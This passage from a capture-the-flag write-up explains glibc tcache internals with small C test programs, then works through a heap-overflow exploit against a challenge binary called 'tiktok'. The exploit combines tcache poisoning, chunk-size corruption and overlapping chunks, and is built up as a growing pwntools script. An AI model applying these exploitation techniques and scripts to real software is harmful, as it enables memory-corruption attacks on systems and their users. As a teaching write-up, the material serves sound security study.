	void * a = malloc(30);
	void * b = malloc(30);
	void * c = malloc(30);

	strcpy(a, first);
	strcpy(b, second);
	strcpy(c, third);

	raise(SIGTRAP);
}
```

The `raise(SIGTRAP)` call will set a breakpoint for us at the end (so we don't have to manually set it every time we run gdb). To make visualization easier, I'll disable ASLR on my machine by running `echo 0 > /proc/sys/kernel/randomize_va_space`

Let's run this program in pwndbg:

![](https://i.imgur.com/gJbzkgd.png)

Since we set a breakpoint, gdb hits it, and we get a nice colorful output. Let's run vmmap (a pwndbg command) to view the memory mappings:

![](https://i.imgur.com/t68GlXz.png)

We see that the heap begins at address 0x602000! Now, let's find where on the heap our strings of A's, B's, C's, etc. are copied to. We can run the `heap` command to see where everything's allocated:

![](https://i.imgur.com/jDLfSdR.png)

Hmm that's weird....we only allocated 3 regions of memory, but why does it say 5? Also, since we're using the tcache allocator, why does it say our chunks are fastbins? Let's start from the top:
* The allocation that happens on 0x602000 is something tcache specific: It's the tcache perthread struct, which looks like this (taken from [here](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#tcache_perthread_struct)):

```clike=
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

```
There are a total of 64 tcache bins, and each bin can hold up to 7 free'd tcache chunks of the same size. (so `TCACHE_MAX_BINS = 64`) The main feature of this struct is to keep a master list of all the tcache bins/linked lists. The "head" freed tcache chunk of each bin will be referenced by one of the pointers in the entries array.

* The next three allocations will be the stuff that we had allocated. The reason why they're labelled fastbins instead of tcachebins is because fastbins were the binning mechanism of older versions of glibc that were replaced by tcachebins, as fastbins and tcachebins occupy the same size range. However, when memory is allocated, the chunk layouts are identical, so it's not possible to distinguish between them.

* The last allocation is part of what some call the top chunk, while others call the wilderness. This chunk represents the remaining space left that's available in the heap, which are free for the program to use. Not surprisingly, the `mchunk_size` value is very large, indicating that we have a lot of heap space left.

Let's look at a pictural view of how the heap is laid out with our allocations, by examining the memory at address 0x602250 (Though I'm going to start examining at 0x602240, for visualization purposes):

![](https://i.imgur.com/UIgv2ou.png)

This is fairly difficult to see, so I'll draw an outline around each chunk:

![](https://i.imgur.com/D7yPEC1.png)

In the above picture, the white box outlines the space of the first allocated chunk, the red box outlines the space of the second allocated chunk, and the blue box outline the space of the third allocated chunk. The green 'box' at the bottom represents the wilderness chunk. On the top right of each chunk is the `mchunk_size` value, and it is set to 0x31 for the three allocations. Since this is odd, we can see that the `prev_inuse` bit is set for all three of them (not surprisingly).

You might be wondering, in the source code, we allocated three 30 byte chunks. However, the `mchunk_size` header is set to 0x30, which is 48 bytes. Why is that the case?

First, heap memory allocations need to be 16-byte aligned. Therefore, if you allocate 30 bytes, the heap will give you the smallest size that can serve this allocation request that's divisible by 16, which is 32.

There's one twist to that rule, however. If you request an allocation size that is exactly divisable by 16, the heap will tack on another 16 bytes af the end. So for example, if we wanted to allocate 32 bytes instead, the heap will give us 48 bytes as usable memory. Similarly, if we wanted to allocate 0 bytes, the heap will give us 16 bytes as usable memory.

Next, the `mchunk_size` header's size values take into account the chunk metadata as well. Since there are 16 bytes worth of additional header size (the size of the unused `mchunk_prev_size` header + the size of the `mchunk_size` header itself), 32 + 16 = 48. (Going from the previous paragraph, an allocation request of 32 bytes will have `mchunk_prev_size` be set to 48 + 16, which is 64 or 0x40. An allocation request of 0 bytes will have `mchunk_prev_size` be set to 16 + 16, which is 32 or 0x20.)

One final observation we can make is that heap allocations go up in memory addresses. so the heap "grows" upwards. This is different from the stack, which "grows" downwards in memory addresses.

You now know what allocated memory looks like, now let's see what they look like when they're freed! We'll modify the test program to be the following:

```clike=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>

char * first = "AAAABBBB";
char * second = "CCCCDDDD";
char * third = "EEEEFFFF";


int main() {
	void * a = malloc(30);
	void * b = malloc(30);
	void * c = malloc(30);

	strcpy(a, first);
	strcpy(b, second);
	strcpy(c, third);

	free(c);
	free(b);
	free(a);

	raise(SIGTRAP);
}
```

Note the order in which I freed the memory: It's the reverse order of the allocations! Now, let's run this in gdb, and examine the memory at address `0x602240` again when the breakpoint hits (again with some added annotations):

![](https://i.imgur.com/T0nwOYf.png)

Looks like our strings of A's and 'B's have disappeared? But we didn't clear them ourselves! This is because when these memory regions are freed, the heap allocator populated the `fd` pointers, and cleared out the `bk` pointers (since they aren't used). 

Remember that we freed the memory in reverse order? Therefore we freed the blue memory chunk first, the red memory chunk second, and the white memory chunk third. When we freed the red memory chunk, its `fd` pointer points to the beginning of the user region of the blue chunk, which was freed first.  When we freed the white memory chunk, its `fd` pointer points to the beginning of the user region of the red chunk, which was freed second. This visualizes the singly linked list nature of chunks within a tcache bin.

We can also visualize the pointer to pointer relationships with the `bins` command (annotated to match the freed memory regions):

![](https://i.imgur.com/LtZh2SN.png)


The observant few of you may find that there's something off with the `mchunk_size` header of the freed chunks - they still say 0x31, so the `prev_inuse` bit is still set! The reason (I think) this is the case is another symptom of trying to add new bin types to glibc without removing the old features - chunks in tcache bins don't automatically unset the `prev_inuse` bit if the previous chunk is free (I may be wrong about this - someone please correct me)

Another question is: Why is the `fd` pointer for the blue chunk 0? The reason is that it's the chunk that's freed first, and so there's no chunk that it could point to. This is different from the `fd` pointer of the first chunk inside the unsorted bin, which will always point to the `main_arena` in libc.

We now know what allocated chunks look like, what freed chunks look like, and their linked list relationship. What if we decide to allocate another 30 bytes after this? Our test code now looks like the following:

```clike=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>

char * first = "AAAABBBB";
char * second = "CCCCDDDD";
char * third = "EEEEFFFF";
char * fourth = "GGGGHHHH";

int main() {
	void * a = malloc(30);
	void * b = malloc(30);
	void * c = malloc(30);

	strcpy(a, first);
	strcpy(b, second);
	strcpy(c, third);

	free(c);
	free(b);
	free(a);

	void * d = malloc(30);
	strcpy(d, fourth);
	raise(SIGTRAP);
	printf("Address: %p\n", d);
}
```

When we run the bins command after hitting the breakpoint, we noticed that the chunk located at 0x602260 has disappeared!

![](https://i.imgur.com/mEGjW9X.png)

Where did it go? When we let the program continue to exit, we found out that the d pointer now equals to 0x602260!

![](https://i.imgur.com/YrFHBVe.png)

This tells us two things: First, not all allocations will take memory away from the wilderness; the heap will try to recycle freed chunks for new allocations if there's a freed chunk that matches the appropriate size request. Second, remember that the 0x602260 allocation chunk was the last chunk to be freed? This tells us that the tcache bin has a last in first out (LIFO) policy: The last memory chunk that was freed is the first one to be recycled. This is done to speed up allocation requests, taking advantage of temporal locality to make heap allocations extra extra fast. If we allocate another 30 bytes of memory, looking at the bins output, we can be sure that malloc will allocate and return a pointer to the chunk at address 0x602290!

Now, for a bit of a spoiler. Let's start thinking maliciously. If we're able to control one of these linked list `fd` pointers to go to somewhere else, what might happen? Well, when `malloc` tries to recycle that freed memory region, it will notice that the next freed chunk that corresponds to the malloc'd size request is located at a location we can control, and so `malloc` will allocate and return a pointer to wherever that `fd` pointer points to! This is called poisoning the tcache. However, since `fd` pointers are only set in freed chunks, surely such a scenario would never happen, right? riiiiiiiiight? (Spoiler: It would very much happen)

Finally, let's modify our test program to see what happens if we allocate and free chunks of different sizes:

```clike=
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>

char * first = "AAAABBBB";
char * second = "CCCCDDDD";
char * third = "EEEEFFFF";
char * fourth = "GGGGHHHH";
char * fifth = "JJJJKKKK";

int main() {
        void * a = malloc(30);
        void * b = malloc(120); //size has changed!
        void * c = malloc(30);

        strcpy(a, first);
        strcpy(b, second);
        strcpy(c, third);

        free(c);
        free(b);
        free(a);

        raise(SIGTRAP);

        void * d = malloc(30);
        strcpy(d, fourth);
        raise(SIGTRAP);
        printf("Address: %p\n", d);

        void * e = malloc(120);
        strcpy(e, fifth);
        raise(SIGTRAP);
}
```

Notice that we have 3 breakpoints this time. When we compile this program, run it in the debugger to the first breakpoint, and view the bin contents, we see the following:

![](https://i.imgur.com/ViEaWh4.png)

Hmm, the freed b pointer is now in a different tcache bin, specifically the 0x80 tcache bin! Now, what happens when we allocate 30 more bytes? Which freed chunk will disappear: the 0x602260 free chunk in the 0x30 tcache bin, or the 0x602290 free chunk in the 0x80 tcache bin? Technically, both are large enough to service an allocation request of 30 bytes!

We continue the program execution to the second breakpoint, and view the bin contents:

![](https://i.imgur.com/UiLPMMC.png)

Looks like `malloc(30)` allocated and returned a pointer to 0x602260, as that disappeared from the bins diagram. This indicates that the tcache allocator will not go to the lengths of splitting a large free chunk up to service a small allocation request, which is a thing in older GLIBC allocators. Therefore, each bin has a very particular size range where freed chunks can go to and be recycled from. (In fact, that size range is a difference of 0x10 bytes! So the tcache bin of size 0x30 will operate on chunks between size 0x20 to 0x30, the tcache bin of size 0x40 will operate on chunks between size 0x20 to 0x30, and so on.)

We now know enough to know what would happen if we call `malloc(120)` next - since the freed b pointer originally had a size of 120, the 0x602290 memory chunk from the 0x80 tcache bin will disappear and be returned by `malloc()`. Let's see if our prediction is right by continuing the program execution, and viewing the bin contents:

![](https://i.imgur.com/xEx41nP.png)

We now know enough about the heap internals and the tcache allocator to complete this challenge. Let's go back to the challenge binary to see what we can do next.

## Laying out our the heap overflow

So how do we exploit the heap overflow? Unlike stack buffer overflows, there aren't any intrinsic targets such as return addresses that we can overwrite to easily control the RIP register. 

What we can do, however, is to manipulate the heap layout such that when we overflow our heap chunk of size 0x20, we can overwrite the `fd` pointers of other freed chunks, so that when `malloc()` recycles them, `malloc()` will end up allocating at and returning a pointer to a location that we can control. This is an attach technique called tcache poisoning, and it's useful to get arbitrary writes. (If you're confused on what I'm talking about here, I encourage you to read the tcache primer section above).

We will be using pwndbg (https://github.com/pwndbg/pwndbg) to debug this binary. Pwndbg is a gdb extension that makes heap and bin visualization much much easier.

First, we need to get pwndbg working with the tiktok binary, as well as our would-be pwntools python script. When we try to import a song while running pwndbg, we see that the program exited:

![](https://i.imgur.com/Pza23LH.png)

This is because when pwndbg debugs a process, if the process forks, the debugger will follow the child process. And since the tiktok binary lists out files by calling `system("ls -R")`, and the `system(arg)` function in libc forks itself with the child process calling `execve("sh", "-c", arg)`, gdb will end up debugging `/bin/sh` and `/bin/ls` instead, which finishes very quickly. To avoid this issue, when we debug this program, we need to run `set follow-fork-mode parent` in pwndbg, so that when the process forks, gdb will still trace the tiktok process.

We'll also need to get gdb working with our pwntools script. However, for some reason, using pwntools's `gdb.attach()` function to attach gdb to our script fails, as pwndbg will spit out a bunch of errors and exit. At the end, we just decided to run our pwntools script, get its spawned process id (pid) value, and attach pwndbg to it by running `gdb -p <pid>`

Second, to make visualization and debugging easier, we'll disable ASLR on our system. We can do that by running `echo 0 > /proc/sys/kernel/randomize_va_space`. Now, our heap, libc, and stack will always be loaded from a constant base address, making writing about the exploitation process easier

Recall that the 44th song is the one that we can abuse strtok and the integer underflow to abuse the heap overflow with. Let's first import 43 "Warrior" directories, do our attack from above to set the 44th imported song's `song->filedesc` to stdin, "play" two of the directories (let's say play songs 1, and then 2), and remove them from the playlist (let's say remove song 2, and then 1, order matters here!). What does the heap tcache bins look like?

![](https://i.imgur.com/ZeLDNWJ.png)

We can tell that the freed song 1 contents ended up at address 0x405260 and the freed song 2 contents ended up at address 0x405280, as song 1 was allocated before song 2. and `0x405260 < 0x405280`. Our heap layout looks like this:

```
[[fd1] freed song 1 ][[fd2] freed song 2 ]
```
Recall from earlier in this writeup that playing a song that's imported from a directory will result in an allocation request of 1 byte. Since song 1 at 0x405260 was the last to be freed, if we play song 44 to do our integer overflow, the program will call `malloc(-1 + 1)` and will recycle the freed song 1's location. (since 0 and 1 are pretty close they'll both belong in the 0x20 tcache bin size). After specifying that we want to allocate -1 bytes, viewing our bins confirmed that the 0x405260 has indeed been recycled: 

![](https://i.imgur.com/A3oddNb.png)


Our heap layout now looks like this:
```
[     song 44     ][[fd2] freed song 2 ]
```

We can now do the overflow. First, let's just enter a lot of A's in traditional buffer overflow style:

![](https://i.imgur.com/Rbc7JaV.png)

When we look at the bin layout, we noticed something interesting has happened:

![](https://i.imgur.com/WK0gOnG.png)

Weird, instead of null, the next tcache chunk's fd pointer has been filled with A's! Our heap layout now looks like this:
```
[AAAAAAAAAAAAAAAAA][[AAA...]AAAed song 2 ]
```

Side note: What if we removed/freed song 1, then 2, instead? Well, since song 2 was the most recently freed song, song 44 would be allocated on top of song 2, so our heap layout would look like this:
```
[[fd1] freed song 1 ][     song 44      ]
```

And if we were to do the overflow on song 44, our heap layout would look like this:

```
[[fd1] freed song 1 ][AAAAAAAAAAAAAAAAAA]AAAAAA
```

so we won't be able to affect the `fd` pointer in the freed chunk of freed song 1. This is why the order in which you allocate and free heap objects during heap exploitation matters!

Now, back to the main task at hand. Now that we have overflowed our next tcache chunk's fd pointer, what happens if we play another song that's imported from a directory (say song # 3)?

Well, actually, nothing too bad happens. That's because in the `tcache_entry` that corresponds to the 0x20 tcache bin in the `per_thread_struct` still contained the address of freed song 2 (0x405280), so that was returned by `malloc()` when we wanted to play song 3.

Our bins now look like this:
![](https://i.imgur.com/ok4eWMV.png)
...and our heap layout looks like this:
```
[AAAAAAAAAAAAAAAAA][    song 3     ]
```

The `tcache_entry` that corresponds to the 0x20 tcache bin in the `per_thread_struct` is now updated with the value of song 2's overwritten `fd` pointer, which is now AAAA or 0x41414141. Let's see what happens when we try to play yet another song that's imported from a directory (say song # 4)?

![](https://i.imgur.com/xv9RYI7.png)

Uh oh...we got a segmentation fault! And looking at why we crashed, it seems like the program was trying to dereference the rdx register, which contained 0x41414141, which is definitely an invalid address. This suggests that we have successfully gotten control on where `malloc()` allocations occur. The tcache allocator tried to allocate memory at address 0x41414141, which isn't a valid address, so the program decided to crash.

Unfortunately, we run into a problem. Even if we can change the poisoned address from 0x41414141 to a valid address, and be able to allocate and write data to wherever we want, we can't really do very much with it if we don't know where to write due to ASLR. And since we can only call `malloc()` once per song according to the IDA decompilation, it's not like we'll be able to overflow tcaches again and again to get more arbitrary writes. Also, if we decided to remove song # 44, the program is going to end up closing the stdin file descriptor, so it will not be able to read any input after that at all! We need to find a way to get more than one arbitrary writes from one heap overflow...somehow...

Fortunately that there are multiple tcache bins for different sizes, and that the first line of each of the song text files in the song.zip file is the size of the song lyrics, aka the size of the `malloc()` allocation if we were to import that song. Recall that the tcache bins range from bins of size 32 to 1032. This means that if there's songs that are less than 1032 bytes in size, if we were to import, play, and remove it, that song's song contents will go into the tcache bin. And, if we can manipulate the heap layout such that we get multiple freed bins after where song # 44 is located, when we do the heap overflow, we will be able to poison multiple tcache bins at once, which should be able to give us multiple arbitrary writes. Sounds like a plan! :D

Let's first see what songs are smaller than 1032 bytes in size. Looking at all the songs in the songs.zip file, we see that the following songs are within tcache size:

* `Animal/animal.txt`, which is 946 bytes.
* `Rainbow/godzilla.txt`, which is 767 bytes.
* `Warrior/pastlive.txt`, which is 829 bytes.

Not a lot, but remember we also have the directory song import, which is 1 byte in size. We now know enough to begin building our final exploit, as we can create the strongest overflow situation.

We'll be using pwntools for our exploit. First, we'll need to create function wrappers that'll interact with each operation in the binary:

```python=
from pwn import *
import struct

#Song size:
"""
<directory>: 1 bytes

Animal/animal.txt: 946 bytes
Rainbow/godzilla.txt: 767 bytes
Warrior/pastlive.txt: 829 bytes
"""

context.binary = "./tiktok"
context.terminal = "/bin/bash"

#sh = remote('ctf.umbccd.io', 4700)
sh = process('./tiktok')

@atexception.register
def handler():
	log.failure(sh.recvall())

def imp(path):
	sh.sendlineafter("Choice: ","1")
	sh.sendline(path)
	sh.recvuntil("like to do today?")

def list(amount, tag):
	sh.sendline("2")
	sh.recvuntil(tag)
	return sh.recv(amount)

def play(id, tag="", amount=0):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.recvuntil(tag)
	s = sh.recv(amount)
	sh.recvuntil("like to do today?")
	return s

def play_overflow(id, length, content): #Use this if the song you're going to play has its file descriptor overwritten by stdin
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.sendline(length)
	if len(content) > 0x450: #Check needed due to weird read() buffering over a network.
		print "Error your payload's too long. It is " + str(len(content)) + " bytes."
		exit()
	sh.sendline(content)
	sh.recvuntil("like to do today?")

def delete(id, getsh=0):
	sh.sendlineafter("Choice: ","4")
	sh.sendline(id)
	if getsh == 0:
		sh.recvuntil("like to do today?")
```

We'll first import a roughly equal number of songs for each song that can fit the tcache bin, including the directories:

```python=
for i in range(0, 11): #ids 1-11 are rainbow-godzilla (767 bytes)
        imp("Rainbow/godzilla.txt")

for i in range(0, 11): #ids 12-22 is a directory (1 bytes)
        imp("Warrior")

for i in range(0, 11): #ids 23-33 is animal-animal (946 bytes)
        imp("Animal/animal.txt")

for i in range(0, 10): #ids 34-43 is Warrior-pastlive (829 bytes)
        imp("Warrior/pastlive.txt")
```

Next, we'll do our attack on the 44th song to import:

```python
badfile = "Warrior" + "/"*(0x18-len("Warrior"))
imp(badfile) #Number 44 now has stdin as file descriptor
```

Note: It is likely that we won't be needing to use all of these songs. However, having them in there doesn't hurt, and allows us to be flexible if we want to change our exploit plan of attack.

## Fighting for a leak
![](https://i.imgur.com/fZsqRqo.png)
(Source: me)

Recall that the each of the song structs in the .bss section had the following layout:

```clike=
struct song {
    char filename[0x18]; //0x404078 (fd_offset) - 0x404060 (song)
    uint64_t filedesc; //0x404080 (authorptr) - 0x404078 (fd_offset)
    char * authorptr; //0x404088 (songtitleptr) - 0x404080 (authorptr)
    char * songptr; //0x404090 (song_content_ptr) - 0x404088 (songtitleptr)
    char * songcontentptr;
}; //0x18 + 8 + 8 + 8 + 8 = 56 bytes in size

struct songs[50]; //where the songs are stored, aka. in the .bss
```

At this point, there are many ways to get an address leak and a shell, and this is where I went down many dead ends.
Here are some of them: 

### Dead end 1: Get a leak from the GOT table, and overwrite the GOT with system()

First, what is the GOT (Global Offset Table) table? This is the list of function pointers into libc for dynamically linked binaries, and it's located in a neighboring memory page to the .bss section. Since ASLR exists, dynamically linked binaries cannot hardcode the addresses of needed functions in libc, as these addresses change upon every execution. The global offset table is where libc updates where the needed functions are within libc during runtime, which solves the ASLR issue. Binaries can be compiled to have partial relro or full relro applied to the global offset table: partial relro means that the global offset table's location has changed relative to the .bss section but the table of function pointers is still writable, while full relro means that the global offset table of function pointers is read only.

Initially, when I ran checksec on this program on my kali machine, its output told me that partial relro, not full relro was enabled. So, I first thought exploitation was easy: poison several tcaches to allocate memory in the .bss section where all the song structs are stored, and change the `song->authorptr` to the GOT entry of `atoi()`, and list the playlist to get the libc address of `atoi()`. I can then use the second poisoned tcache to allocate memory right over the global offset table entry of `atoi()`, and then edit the global offset table entry of `atoi()` to point to `system()` instead. At that time I moved into my Ubuntu 18.04 docker container, and running checksec indicated that the binary did have full relro enabled, so I cannot write to the GOT. Since I couldn't write to the GOT, I had already used up my ability to choose where I could place my next allocation from the libc leak, as I don't have the knowledge of where anything in libc is located when I poisoned the tcache. (otherwise I'd choose to poison the tcache with the address of `__free_hook()` instead). I can still leak the libc addresses from it though, which ended up being part of my final solution.

### Dead end 2: Get a libc leak from the unsorted bin

Recall that we only found 3 songs that were in the tcache's size range. However, there are many other longer songs, where if we freed them their song contents would end up in the unsorted bin instead. Also recall that when you free your first memory chunk into the unsorted bin, its `fd` and `bk` pointers would be pointing to the `main_arena` data structure, which is in libc.

We could leak out a freed unsorted bin chunk's `fd` pointer into `main_arena` by overflowing to right before that `fd` pointer. This would work since the data is being read through the `read()` function, which, as you remember, doesn't null-terminate your input. The main problem with this idea is we want to be able to poison multiple tcache bins as well, and that when the contents are printed back out, it is printed by using the `printf()` function, which treats the memory to be printed as a string. Since we're dealing with a 64 bit application, 64 bit addresses will contain null bytes. Therefore, if we were to do this attack, sure we can overflow up to right before the unsorted bin chunk's `fd` pointer, but when we print the contents, it's only going to print up to where our first poisoned address is, so the address leak will never be printed.

(Granted, the other two teams who solved this challenge, as well as trashcanna who created this challenge, were able to leverage the unsorted bin for both the leak and the final write to get a shell by abusing the unsorted bin's chunk coalescing/splitting mechanism. I'll link the writeups (when they come) to their solutions at the bottom of this writeup. However, I'm going to be going unsorted bin free, and exploit this binary by only using the tcache mechanism.)

### Dead end 3: Zeroing out the per_thread_struct to unpoison the tcache

I initially made a mistake while doing decompilation analysis of the `remove_song()` function that tricked me into believing that as part of the deallocation process, the program will dereference one of the song struct's fields, and null them out after dereferencing. So therefore I proceeded the same way to get a libc leak as in dead end 1, and used it and some more writes to leak heap pointers that are stored in main_arena, which allows me to defeat ASLR on the heap and calculate the address of the `per_thread_struct`, so I can NULL the poisoned tcache entries out since I have control to everything in the .bss section in memory. However, once I realized that `remove_song()`doesn't dereference anything, I realized that changing values on the .bss section doesn't affect what gets zeroed out, and I was out of arbitrary writes at that point, so I was out of steam by then.

(Again, trashcanna's solution did involve messing with this struct. Lots of the nudges I got from her was to use this exploitation path, but I'm a heap noob and was unable to figure it out, so I decided to find my own way out. I'll add her solution writeup to the bottom when they come).

Eventually, I was able to find my way out that only used tcache bin mechanisms: No unsorted bins, and no per_thread_struct overwrites.

## A leak in the darkness.

![](https://i.imgur.com/VS2mv7f.png)

(source: me)

So, what should we do? What else can we overwrite on our heap that may be of interest to us?

Well, the `fd` pointers aren't the only things that exist on the heap. The `mchunk_size` headers exist as well, and while they in itself don't allow you to arbitrarily gain control of memory, maybe we can still mess with them to put ourselves in a good position?

Anyways, recall that our exploit script is currently the following:

```python
from pwn import *
import struct

#Song size:
"""
<directory>: 1 bytes

Animal/animal.txt: 946 bytes
Rainbow/godzilla.txt: 767 bytes
Warrior/pastlive.txt: 829 bytes
"""

context.binary = "./tiktok"
context.terminal = "/bin/bash"

#sh = remote('ctf.umbccd.io', 4700)
sh = process('./tiktok')

@atexception.register
def handler():
	log.failure(sh.recvall())

def imp(path):
	sh.sendlineafter("Choice: ","1")
	sh.sendline(path)
	sh.recvuntil("like to do today?")

def list(amount, tag):
	sh.sendline("2")
	sh.recvuntil(tag)
	return sh.recv(amount)

def play(id, tag="", amount=0):
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.recvuntil(tag)
	s = sh.recv(amount)
	sh.recvuntil("like to do today?")
	return s

def play_overflow(id, length, content): #Use this if the song you're going to play has its file descriptor overwritten by stdin
	sh.sendlineafter("Choice: ", "3")
	sh.sendline(id)
	sh.sendline(length)
	if len(content) > 0x450: #Check needed due to weird read() buffering over a network.
		print "Error your payload's too long. It is " + str(len(content)) + " bytes."
		exit()
	sh.sendline(content)
	sh.recvuntil("like to do today?")

def delete(id, getsh=0):
	sh.sendlineafter("Choice: ","4")
	sh.sendline(id)
	if getsh == 0:
		sh.recvuntil("like to do today?")

for i in range(0, 11): #ids 1-11 are rainbow-godzilla (767 bytes)
        imp("Rainbow/godzilla.txt")

for i in range(0, 11): #ids 12-22 is a directory (1 bytes)
        imp("Warrior")

for i in range(0, 11): #ids 23-33 is animal-animal (946 bytes)
        imp("Animal/animal.txt")

for i in range(0, 10): #ids 34-43 is Warrior-pastlive (829 bytes)
        imp("Warrior/pastlive.txt")
        
badfile = "Warrior" + "/"*(0x18-len("Warrior"))
imp(badfile) #Number 44 now has stdin as file descriptor
```

We'll first play songs 12, 13, and 2 (all 0x20 byte allocations), import two more directories as songs, and play them both (both 0x20 byte allocations), and then play song 23 (946 -> 0x3c0 byte allocation):

```python=
play("12")
play("13")
play("2") #Reserving song #1 for later use


imp("Warrior") #These will be used in the final tcache poison
imp("Warrior")
play("45")
play("46")

play("23")
```

Our heap layout looks like this:

```
------------------
|                | <-12
------------------
|                | <-13
------------------
|                | <-2
|                |
|                |
|                |
|                |
------------------
|                | <- 45
------------------ 
|                | <- 46
------------------
|                | <- 23
|                |
|                |
|                |
|       ...      |
```

Next, we'll free songs 12, 13, 2, and 23. The order in which we free songs 2 and 23 doesn't matter, but we need to free song 13 before song 12, so that when we play song 44 (the one we can overflow with) later, malloc will recycle the song location of song 12, so that we can poison the tcache `fd` pointer that's in song 13. This python snippet should do the trick.

```python
delete("13")
delete("12")
delete("2")
delete("23")
```

When we see how the bins look like in pwndbg at this point, we see the following output:

![](https://i.imgur.com/DcemaEx.png)

Note that we're not freeing songs 45 and 46 just yet. This is because when we do the overflow to adjust their `mchunk_size` headers, we want to do it while they're allocated. You'll see why we want to do this in a bit, we're just geting started :D

Now, we're going to do the overflow. First, we need to find the offsets on which the freed tcache chunk's pointers are. We'll be using the `play_overflow()` function to do the overflow, and we can use pwntool's `cyclic()` function to generate a payload that can give us some offset information: 

```python=
play_overflow("44", "-1", cyclic(1000))
sh.interactive() #<- allows the process to keep running, letting us attach gdb to it.
```

When we run our exploit so far, the heap's positional layout should look like this:

```
------------------
|                | <-44----------
------------------              O
|                | <-13 (freed) V
------------------              E 
|                | <-2 (freed)  R
|                |              F
|                |              L
|                |              O
|                |              W
------------------              |
|                | <- 45        v
------------------ 
|                | <- 46
------------------
|                | <- 23 (freed)
|                |
|                |
|                |
|       ...      |
```

Since freed song 23 is below non-freed songs 45 and 46, we don't really need to care about poisoning song 23's tcache, aka the 0x3c0 bin tcache. Therefore we only need to worry about calculating the offsets for song 13's `fd` pointer (to poison the 0x20 tcache bin) and song 2's `fd` pointer (to poison the 0x310 tcache bin)

When we ran the tiktok app and attached pwndbg to it and view the bin state, we see the following:

![](https://i.imgur.com/zwQ6UM0.png)

Looks like we poisoned three tcache bins with this payload, but we really only need to worry about two, as well as the `mchunk_size` headers of songs 45 and 46. We can find the offsets of song 13's `fd` pointer by running `cyclic -l 'iaaa'` and the offsets of song 2's `fd` pointer by running `cyclic -l 'qaaa'`:

![](https://i.imgur.com/5v16ycu.png)

Therefore, our heap overflow payload can begin with the following:

```python
payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
```

Note: We don't know what the bss_segment and bss_segment_2 addresses are yet, we'll worry about that latter.

Finding the offsets to the `mchunk_size` pointers for songs 45 and 46 is going to be more difficult. Fortunately, we know that the heap pointers to songs 45 and 46 are stored in the `song->songcontentptr` location in the .bss section, so we can just view the .bss memory. Running `vmmap` on this process shows how the memory's laid out:

![](https://i.imgur.com/y07aQSK.png)

The .bss is a readable and writable memory segment before the heap, so it begins at address 0x404000. We can use pwndbg's telescope command to view the .bss memory for heap pointers:

![](https://i.imgur.com/VmWiuPT.png)

Looks like we found some at the end! Pretty sure the first one's just song # 44 though, as it begins with 'aaaa'. However, we can use `cyclic -l` to find the offset for where song number 45's and 46's `mchunk_size` offsets are located:

![](https://i.imgur.com/JwgY89t.png)

Note: We subtracted 16 to account for the `mchunk_size` and the unused `mchunk_prev_size` headers, and we subtracted 72 to account for the previous padding to poison song 2. 

What should we overwrite the `mchunk_size` headers to though? Well, what happens if we make them super super big? Well, let's think about it! Songs 45 and 46 both belong to 0x20 sized bins, and since song 46 was played right after sont 45, they are adjacent to each other. Something like this:

```
------------------
|                | <- 45
------------------ 
|                | <- 46
------------------
```

So what happens if we increase the `mchunk_size` headers by a lot? Well, while they're allocated, that doesn't give us a lot, as we can't change memory contents of these chunks again. However, what if we removed both of them, song 46 and then song 45?

Well, `free()` will look at the `mchunk_size` headers, see they're larger than normal, and should place them in a larger than normal tcache bin. Still not too exciting yet, but oh, do you see what I see? We're likely to use some tcache poisoned writes to clobber the .bss section, which will allow us to change many song's `song->filedesc` into 0, and instead of doing the integer underflow by specifying -1 when we play these songs, we could specify what we overwrote the `mchunk_size` header with to make the tcache allocator reuse these chunks! However, since these chunks for songs 45 and 46 were originally very small and right next to each other, if we allocate larger amounts of memory to have the tcache allocator reuse the same locations of song 45 and 46, they have no choice but to overlap! Woah! (Getting an overlap at an offset, so not a perfect overlap, is one of the most common targets of heap exploitation btw)

So, the memory region will look something like this:

```
--------------------
|                  | <- Some song that reused 45
|------------------| 
||                || <- Some song that reused 46
||                ||
        ...
||                ||
||                ||
|------------------| <- end of 45
 |                |
 ------------------ <- end of 46
```

Are you thinking what I'm thinking now? After we specifiy the song length to be what we overwrote the `mchunk_size` header with, when we specify the contents that go into song 45, we can now overwrite the freed song # 46's `fd` pointer to poison the tcache again! The best part of this is that this will happen *after* we get the libc leak, so we can now poison the tcache with some libc address to get more leverage on what we can execute! Success!

Now, time to be able to actually implement this attack. At this point I tried several large values, and was able to successfully overlap. However, when I try to free songs 45 and 46 into a new tcache bin and try to get the tcache poisoning attack working, the program would raise a `SIGABRT` signal, telling me that this check had failed:

`sysmalloc: Assertion '(old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)' failed.`

I still don't know why this kept coming up, some clarification would be nice. I did eventually realize, however, that if I overwrite song 45 and 46's `mchunk_size` header to be 0x3c1 bytes in size (the freed chunk size of the freed song 23), this error does not occur. (This is the only reason why I ended up dealing with song 23 in the first place.)

Our payload now would look something like the following, without bss_segment addresses defined:

```python
payload = "A"*32
payload += bss_segment
payload += "B"*(32-8)
payload += bss_segment_2
payload += "C"*760


payload += p64(0) + p64(0x3c1) #Song num 45 is now in a 0x3c0 byte chunk
payload += "\x00"*(880 - 848 - 8)
payload += p64(0x3c1) #Song num 46 is now in an 0x3c0 byte chunk
payload += "\x00"*48
play_overflow("44", "-1", payload)
```

Note that I'm not unsetting the `prev_inuse` bits for song number 45 and 46, as I want them to still be able to be freed into the 0x3c0 tcache bin.

The heap boundary layout should now look like this, according to the `mchunk_size` header values.(going to ignore song 23 to not make it too confusing):

```
 ------------------
 |                | <-44----------
 ------------------              O
 |                | <-13 (freed) V
 ------------------              E 
 |                | <-2 (freed)  R
 |                |              F
 |                |              L
 |                |              O
 |                |              W
--------------------             |
|                  | <- 45        v
|------------------| 
||                || <- 46
||                ||
||                || <- song 23 (freed) somewhere covered in there.
||                ||
||                ||
